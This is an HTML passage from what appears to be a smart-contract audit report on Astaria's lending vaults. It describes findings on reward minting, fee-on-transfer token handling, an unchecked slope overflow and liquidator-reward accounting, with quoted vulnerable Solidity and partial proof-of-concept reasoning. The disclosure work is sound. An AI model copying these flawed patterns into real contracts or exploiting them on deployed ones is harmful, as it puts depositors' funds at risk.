0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>As confirmed by the sponsor, the strategist reward is supposed to be “paid on performance and only@on interest. if the payment that’s being made is greater than the interest owing we only mint them based on the interest owed, but if it’s less, then, mint their shares based on the amount”</p>\n<p>However, this is not the case. When LienToken calls beforePayment, which calls _handleStrategistInterestReward, the amount passed in is the amount of the lien (stack.point.amount), not the amount paid.</p>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/LienToken.sol#L819</a><br>\nI believe <code>stack.point.amount</code> should be changed to <code>amount</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/435#issuecomment-1406792466\">androolloyd (Astaria) commented</a>:</strong></p>\n<blockquote>\n<p>Since we track payments against the principle via stack.point.amount, then you want to ensure that what were sending them is the correct amount. Lien data doesnt track the balance of a loan, only the max value a lien can have.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/435\">SantiagoGregory (Astaria) acknowledged</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/435#issuecomment-1439648798\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p><code>stack.point.amount</code>, which represents the remaining debt amount should be replaced by the amount actually paid to mitigate this attack.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-09-tokens-with-fee-on-transfer-are-not-supported-in-publicvaultsol\" style=\"position:relative;\"><a href=\"#m-09-tokens-with-fee-on-transfer-are-not-supported-in-publicvaultsol\" aria-label=\"m 09 tokens with fee on transfer are not supported in publicvaultsol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/424\">[M-09] Tokens with fee on transfer are not supported in <code>PublicVault.sol</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/424\">Rolezn</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/442\">peakbolt</a></em></p>\n<p>Some tokens take a transfer fee (e.g. <code>STA</code>, <code>PAXG</code>), some do not currently charge a fee but may do so in the future (e.g. <code>USDT</code>, <code>USDC</code>).</p>\n<p>Should a fee-on-transfer token be added to the <code>PublicVault</code>, the tokens will be locked in the <code>PublicVault.sol</code> contract. Depositors will be unable to withdraw their rewards.\nIn the current implementation, it is assumed that the received amount is the same as the transfer amount. However, due to how fee-on-transfer tokens work, much less will be received than what was transferred.</p>\n<p>As a result, later users may not be able to successfully withdraw their shares, as it may revert at <a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148</a> when <code>WithdrawProxy</code> is called due to insufficient balance.</p>\n<h3 id=\"proof-of-concept-27\" style=\"position:relative;\"><a href=\"#proof-of-concept-27\" aria-label=\"proof of concept 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>i.e. Fee-on-transfer scenario:<br>\nContract calls transfer from contractA 100 tokens to current contract<br>\nCurrent contract thinks it received 100 tokens<br>\nIt updates balances to increase +100 tokens<br>\nWhile actually contract received only 90 tokens<br>\nThat breaks whole math for given token</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">whenNotPaused</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">VIData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadVISlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allowListEnabled</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">allowList</span><span class=\"mtk1\">[</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L251-L265\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L251-L265</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"78\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _redeemFutureEpoch(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VaultData storage s,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 shares,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address receiver,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address owner,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint64 epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) internal virtual returns (uint256 assets) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check to ensure that the requested epoch is not in the past</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20Data storage es = _loadERC20Slot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender != owner) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (allowed != type(uint256).max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        es.allowance[owner][msg.sender] = allowed - shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (epoch &lt; s.currentEpoch) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidState(InvalidStates.EPOCH_TOO_LOW);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require((assets = previewRedeem(shares)) != 0, &quot;ZERO_ASSETS&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check for rounding error since we round down in previewRedeem.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    //this will underflow if not enough balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    es.balanceOf[owner] -= shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Cannot overflow because the sum of all user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // balances can&#39;t exceed the max uint256 value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      es.balanceOf[address(this)] += shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit Transfer(owner, address(this), shares);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _deployWithdrawProxyIfNotDeployed(s, epoch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit Withdraw(msg.sender, receiver, owner, assets, shares);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // WithdrawProxy shares are minted 1:1 with PublicVault shares</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148-L190\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L148-L190</a></p>\n<p>These functions inherits functions from the <code>ERC4626-Cloned.sol</code><br>\n<a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"79\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Check for rounding error since we round down in previewDeposit.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">((</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">previewDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">)) != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;ZERO_SHARES&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">(), </span><span class=\"mtk8\">&quot;VALUE_TOO_SMALL&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Need to transfer before minting or ERC777s could reenter.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Deposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">receiver</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">afterDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L19-L36\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626-Cloned.sol#L19-L36</a></p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ol>\n<li>Consider comparing before and after balance to get the actual transferred amount.</li>\n<li>Alternatively, disallow tokens with fee-on-transfer mechanics to be added as tokens.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/424\">androolloyd (Astaria) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-10-public-vault-slope-can-overflow\" style=\"position:relative;\"><a href=\"#m-10-public-vault-slope-can-overflow\" aria-label=\"m 10 public vault slope can overflow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/418\">[M-10] Public vault slope can overflow</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/418\">evan</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L562-L568\">https://github.com/code-423n4/2023-01-astaria/blob/main/src/PublicVault.sol#L562-L568</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/57c2fe33c1d57bc2814bfd23592417fc4d5bf7de/src/LienToken.sol#L702-L704\">https://github.com/code-423n4/2023-01-astaria/blob/57c2fe33c1d57bc2814bfd23592417fc4d5bf7de/src/LienToken.sol#L702-L704</a></p>\n<p>The slope of public vault can overflow in the afterPayment function due to unchecked addition. When this happens, totalAssets will not be correct. This can also result in underflows in slope updates elsewhere, causing large fluctuations in slope and totalAssets.</p>\n<h3 id=\"proof-of-concept-28\" style=\"position:relative;\"><a href=\"#proof-of-concept-28\" aria-label=\"proof of concept 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Assume the token is a normal 18 decimal ERC20 token.<br>\nAfter 5 loans of 1000 tokens, all with the maximum interest rate of 63419583966, the slope will overflow.<br>\n<code>5 * 1000 * 63419583966 / 2^48 = 1.1265581173</code></p>\n<h3 id=\"tools-used-8\" style=\"position:relative;\"><a href=\"#tools-used-8\" aria-label=\"tools used 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VSCode</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the unchecked block. Also, I think 48 bits might not be enough for slope.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/418\">SantiagoGregory (Astaria) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-11-liquidator-reward-is-not-taken-into-account-when-calculating-potential-debt\" style=\"position:relative;\"><a href=\"#m-11-liquidator-reward-is-not-taken-into-account-when-calculating-potential-debt\" aria-label=\"m 11 liquidator reward is not taken into account when calculating potential debt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/400\">[M-11] Liquidator reward is not taken into account when calculating potential debt</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/400\">evan</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/66\">ladboy233</a></em></p>\n<p>Liquidator reward is not taken into account when calculating potential debt. When liquidationInitialAsk is set to the bare minimum, liquidator reward will always come at the expense of vaults late on in the stack.</p>\n<h3 id=\"proof-of-concept-29\" style=\"position:relative;\"><a href=\"#proof-of-concept-29\" aria-label=\"proof of concept 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following test where the vault loses more than 3 tokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity =0.8.17;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {Authority} from &quot;solmate/auth/Auth.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span 